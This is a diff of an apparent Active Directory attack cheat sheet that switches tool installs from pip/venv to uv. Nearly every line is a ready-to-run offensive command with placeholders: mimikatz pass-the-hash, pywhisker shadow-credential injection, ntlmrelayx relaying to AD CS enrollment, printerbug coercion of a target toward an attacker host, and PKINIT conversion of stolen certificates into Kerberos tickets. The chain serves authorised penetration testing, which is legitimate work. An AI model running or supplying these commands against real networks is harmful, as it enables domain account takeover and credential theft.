@@ -202,10 +202,10 @@ mimikatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:powe
 ```bash
 # https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/
 # https://github.com/ShutdownRepo/pywhisker.git
-git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker && pip3 install -r requirements.txt && cd pywhisker
+git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker && uv pip install -r requirements.txt
 
 # Get Certificate for user
-python3 pywhisker.py --dc-ip <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' --target <NEW_USER> --action add
+uv run python3 pywhisker.py --dc-ip <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' --target <NEW_USER> --action add
 # creates .pfx file of <NEW_USER> and PFX password
 ```
 
@@ -213,10 +213,8 @@ python3 pywhisker.py --dc-ip <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' --tar
 # Intercept web enrollment requests
 # https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
 # NOTE: use https://github.com/ly4k/Certipy to find other templates
-python3 -m venv venv
-pip install git+https://github.com/fortra/impacket.git
-hash -r
-venv/bin/ntlmrelayx.py --adcs --smb2support --template KerberosAuthentication -t <WEB_ENROLL_SERVER>
+uv tool install git+https://github.com/fortra/impacket.git
+ntlmrelayx.py --adcs --smb2support --template KerberosAuthentication -t <WEB_ENROLL_SERVER>
 # outputs *.pfx file
 
 # Force arbitrary auth from <TARGET> to <ATTACKER> via printers
@@ -227,10 +225,10 @@ python3 printerbug.py <DOMAIN>/<USERNAME>:"<PASSWORD>"@<TARGET> <ATTACKER>
 
 # PtC to get TGT
 # https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py
-git clone https://github.com/dirkjanm/PKINITtools.git ; cd PKINITtools ; python3 -m venv .venv ; source .venv/bin/activate ; pip3 install -r requirements.txt ; pip3 install -I git+https://github.com/wbond/oscrypto.git
+git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools && uv pip install -r requirements.txt && uv pip install git+https://github.com/wbond/oscrypto.git
 
 # OPTIONAL: -pfx-pass from pywhisker.py
-python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass <PFX_PASS> -dc-ip <DC_IP> '<DOMAIN>/<USER>' <OUTPUT_TGT>
+uv run python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass <PFX_PASS> -dc-ip <DC_IP> '<DOMAIN>/<USER>' <OUTPUT_TGT>
 # gives <OUTPUT_TGT>
 
 ---
